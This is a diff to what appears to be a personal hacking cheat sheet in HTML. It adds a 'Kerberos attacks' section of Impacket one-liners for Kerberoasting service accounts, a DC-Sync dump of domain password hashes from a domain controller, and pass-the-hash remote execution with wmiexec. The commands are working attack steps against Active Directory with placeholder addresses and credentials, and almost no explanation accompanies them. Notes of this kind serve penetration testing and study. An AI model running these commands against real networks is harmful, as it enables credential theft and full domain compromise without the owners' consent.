@@ -103,3 +103,12 @@ usefull tips and tools for hacking
   <li> PingCastle.exe --server x.x.x.x --export users --user domainuser --password domainpassword
   
 </ul>
+
+<b>Kerberos attacks </b>
+<ul>
+  <li> From a non-domain PC: python GetUsersSPN.py -dc-ip x.x.x.x bla.local/account:password -request
+  <li> or from a domain joined PC python GetUsersSPN.py bla.local/account:password -request
+  <li>
+  <li> DC-Sync attack: python secretsdump.py bla.local/account:password@dc1.bla.local
+  <li> if that works you can use python wmiexec.py bla.local/account@dc1.bla.local -hashes "insert hash"
+</ul>
